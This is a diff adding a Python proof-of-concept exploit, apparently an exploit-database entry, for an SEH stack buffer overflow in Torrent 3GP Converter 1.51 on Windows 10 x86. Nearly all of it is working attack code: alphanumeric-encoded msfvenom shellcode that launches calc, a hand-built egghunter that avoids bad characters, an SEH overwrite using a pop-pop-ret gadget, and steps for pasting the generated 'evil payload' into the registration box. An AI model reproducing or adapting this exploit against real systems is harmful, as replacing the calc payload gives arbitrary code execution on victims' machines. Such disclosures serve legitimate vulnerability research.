@@ -1,0 +1,132 @@
+# Exploit Title: Torrent 3GP Converter 1.51 - Stack Overflow (SEH)
+# Exploit Author: boku
+# Date: 2020-01-24
+# Software Vendor: torrentrockyou
+# Vendor Homepage: http://www.torrentrockyou.com
+# Software Link: http://www.torrentrockyou.com/download/tr3gpconverter.exe
+# Version: Torrent 3GP Converter Version 1.51 Build 116
+# Tested On: Windows 10 Home (x86) 10.0.18363 Build 18363
+# Tested On: Windows 10 Education (x86) 10.0.18363 Build 18363
+# Tested On: Windows 10 Pro (x86) 10.0.18363 Build 18363
+# Recreate:
+#  1) Download, install, and open Torrent 3GP Converter 1.51 Build 116 for windows x86
+#  2) run python script & open created 'crash.txt' file
+#  3) select-all > copy-all
+#  4) in app, click 'Register' on the bottom
+#  5) in 'Name:' textbox enter 'a'
+#  6) in 'Code:' textbox paste buffer
+#  7) click 'OK', calculator will open & app will crash
+
+#!/usr/bin/python
+
+# Bad Chars 
+# \x00 => \x20 # \x0d Truncates buffer # \x2d Gets ejected from buffer
+# \x61-\x6f => \x41-\x4f / ASCII Lower => ASCII Upper
+# \x70-\x7a => \x50-\x5a / ASCII Lower => ASCII Upper
+# \x9a => \x8a # \x9c => \x8c # \x9e => \x8e
+# \xe0-\xef => \xc0-\xcf # \xf0-\xf6 => \xd0-\xd6
+# \xf8-\xfe => \xd8-\xde # \xff => \x9f
+# badChars='\x00\x0d\x2d\x61\x62\x63\64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x9a\x9c\x9e\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xee\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff'
+# Max shellcode size is 2384  bytes
+# - First 2384 bytes of our buffer is left unmangled on the stack
+# msfvenom -p windows/exec CMD='calc' -e x86/alpha_upper --format python -v shellcode
+# x86/alpha_upper chosen with final size 447
+# Payload size: 447 bytes
+## msfvenom x86/alpha_uppers GetPC Routine ##
+#  [!] Does not work because of the bad chars!
+# Manually replaced with a working version of GetPC for this exploit
+# 89E5            mov ebp, esp
+shellcode = b'\x54\x5D' # push esp # pop ebp
+# DBCD            fcmovne st, st(5)
+shellcode += b'\x89\xCF' # mov edi, ecx
+# D975 F4         fstenv [ebp-C]
+shellcode += b'\x47\x47\x90' # inc edi # inc edi # nop
+# 5F              pop edi  
+shellcode += b'\x90' # nop
+shellcode += b"\x57\x59\x49"
+shellcode += b"\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a"
+shellcode += b"\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30"
+shellcode += b"\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41"
+shellcode += b"\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42"
+shellcode += b"\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a"
+shellcode += b"\x49\x4b\x4c\x5a\x48\x4d\x52\x55\x50\x55\x50"
+shellcode += b"\x33\x30\x43\x50\x4b\x39\x4b\x55\x46\x51\x59"
+shellcode += b"\x50\x42\x44\x4c\x4b\x30\x50\x36\x50\x4c\x4b"
+shellcode += b"\x56\x32\x34\x4c\x4c\x4b\x56\x32\x42\x34\x4c"
+shellcode += b"\x4b\x34\x32\x31\x38\x34\x4f\x4e\x57\x50\x4a"
+shellcode += b"\x37\x56\x30\x31\x4b\x4f\x4e\x4c\x47\x4c\x35"
+shellcode += b"\x31\x43\x4c\x34\x42\x56\x4c\x47\x50\x39\x51"
+shellcode += b"\x58\x4f\x34\x4d\x45\x51\x59\x57\x4a\x42\x4a"
+shellcode += b"\x52\x46\x32\x56\x37\x4c\x4b\x31\x42\x44\x50"
+shellcode += b"\x4c\x4b\x50\x4a\x47\x4c\x4c\x4b\x50\x4c\x42"
+shellcode += b"\x31\x33\x48\x4b\x53\x51\x58\x45\x51\x4e\x31"
+shellcode += b"\x30\x51\x4c\x4b\x31\x49\x51\x30\x55\x51\x59"
+shellcode += b"\x43\x4c\x4b\x30\x49\x42\x38\x4b\x53\x37\x4a"
+shellcode += b"\x57\x39\x4c\x4b\x47\x44\x4c\x4b\x53\x31\x59"
+shellcode += b"\x46\x46\x51\x4b\x4f\x4e\x4c\x39\x51\x38\x4f"
+shellcode += b"\x34\x4d\x35\x51\x4f\x37\x57\x48\x4d\x30\x53"
+shellcode += b"\x45\x4c\x36\x45\x53\x53\x4d\x4a\x58\x37\x4b"
+shellcode += b"\x43\x4d\x46\x44\x33\x45\x4a\x44\x56\x38\x4c"
+shellcode += b"\x4b\x36\x38\x47\x54\x45\x51\x38\x53\x32\x46"
+shellcode += b"\x4c\x4b\x44\x4c\x30\x4b\x4c\x4b\x50\x58\x45"
+shellcode += b"\x4c\x53\x31\x59\x43\x4c\x4b\x45\x54\x4c\x4b"
+shellcode += b"\x33\x31\x38\x50\x4d\x59\x57\x34\x57\x54\x36"
+shellcode += b"\x44\x31\x4b\x51\x4b\x33\x51\x36\x39\x31\x4a"
+shellcode += b"\x50\x51\x4b\x4f\x4d\x30\x51\x4f\x31\x4f\x50"
+shellcode += b"\x5a\x4c\x4b\x45\x42\x5a\x4b\x4c\x4d\x51\x4d"
+shellcode += b"\x52\x4a\x35\x51\x4c\x4d\x4c\x45\x48\x32\x35"
+shellcode += b"\x50\x43\x30\x33\x30\x46\x30\x43\x58\x46\x51"
+shellcode += b"\x4c\x4b\x42\x4f\x4d\x57\x4b\x4f\x59\x45\x4f"
+shellcode += b"\x4b\x5a\x50\x38\x35\x39\x32\x31\x46\x53\x58"
+shellcode += b"\x4e\x46\x5a\x35\x4f\x4d\x4d\x4d\x4b\x4f\x58"
+shellcode += b"\x55\x47\x4c\x35\x56\x43\x4c\x35\x5a\x4b\x30"
+shellcode += b"\x4b\x4b\x4d\x30\x42\x55\x44\x45\x4f\x4b\x37"
+shellcode += b"\x37\x45\x43\x54\x32\x32\x4f\x42\x4a\x55\x50"
+shellcode += b"\x36\x33\x4b\x4f\x58\x55\x45\x33\x55\x31\x32"
+shellcode += b"\x4c\x43\x53\x35\x50\x41\x41"
+# Stack EggHunter for fun & profit 
+egg = 'BOKU'
+hunterOS = '\x41'*(2784-len(egg+egg+shellcode))
+# After executing the code in nSEH, we are left with 88 bytes to create our Hunter
+hunter  = '\x4C'*4 # dec esp * 4 / avoid sub bad char / topOfStack=GetPC
+hunter  += '\x5B' # pop ebx / EBX=PC
+hunter  += '\x80\x43\x29\x20'     #   add byte [ebx+41], 0x20 / 20+55=7F=jnz
+hunter  += '\x80\x43\x33\x20'     #   add byte [ebx+51], 0x20 / 20+55=7F=jnz
+hunter  += '\xB8\x42\x4F\x4B\x55' # mov eax,0x424f4b55
+hunter  += '\x54' # push esp
+hunter  += '\x59' # pop ecx
+hunter  += '\x90'*18 # nop fillers for jnz short -7 loop
+hunter  += '\x49' # dec ecx
+hunter  += '\x3B\x01' # cmp eax, [ecx]
+hunter  += '\x55\xF7' # 75F7 = jnz short -7 / Have to avoid bad \xF- chars
+hunter  += '\x51' # push ecx
+hunter  += '\x5a' # pop edx
+hunter  += '\x4a'*4 # dec edx * 4 / check if second egg matchs
+hunter  += '\x3B\x02' # cmp eax, [edx]
+hunter  += '\x55\xDF' # jnz short -31 / back to the loop - avoid bad chars
+hunter  += '\x83\xc1\04' # add ecx, 0x4 / start of shellcode after eggs
+hunter  += '\x31\xd2' # xor edx,edx
+hunter  += '\x52' # push edx
+hunter  += '\xC6\x44\x24\x02\x4B' # mov byte [esp+0x2],0x4b
+hunter  += '\xC6\x44\x24\x01\x44' # mov byte [esp+0x1],0x44
+hunter  += '\xC6\x04\x24\x39'     # mov byte [esp],0x39
+# [ESP]=0x004b4439 : call ecx | startnull,asciiprint,ascii,alphanum,uppernum {PAGE_EXECUTE_READWRITE} [bsvideoconverter.exe]
+#   ASLR: False, Rebase: False, SafeSEH: False, OS: False, v4.2.8.1 (C:\Program Files\Torrent 3GP Converter\bsvideoconverter.exe)
+hunter  += '\xc3' # ret
+huntRmdr = '\x41'*(88-len(hunter))
+nsehOS   = '\x90'*(4500-len(egg+egg+shellcode+hunterOS+hunter+huntRmdr))
+nSEH     = '\x83\xC4\x04\xC3'     # add esp,byte +0x4 # ret
+# 3-byte SEH overwrite using the truncating Null byte
+SEH      = '\x0f\x47\x4c' # 0x004c470f : pop esi # pop ebx # ret [bsvideoconverter.exe] 
+         # ASLR: False, Rebase: False, SafeSEH: False {PAGE_EXECUTE_READWRITE} 
+
+payload  = egg+egg+shellcode+hunterOS+hunter+huntRmdr+nsehOS+nSEH+SEH
+
+try:
+    f=open("crash.txt","w")
+    print("[+] Creating %s bytes evil payload." %len(payload))
+    f.write(payload)
+    f.close()
+    print("[+] File created!")
+except:
+    print("File cannot be created.")
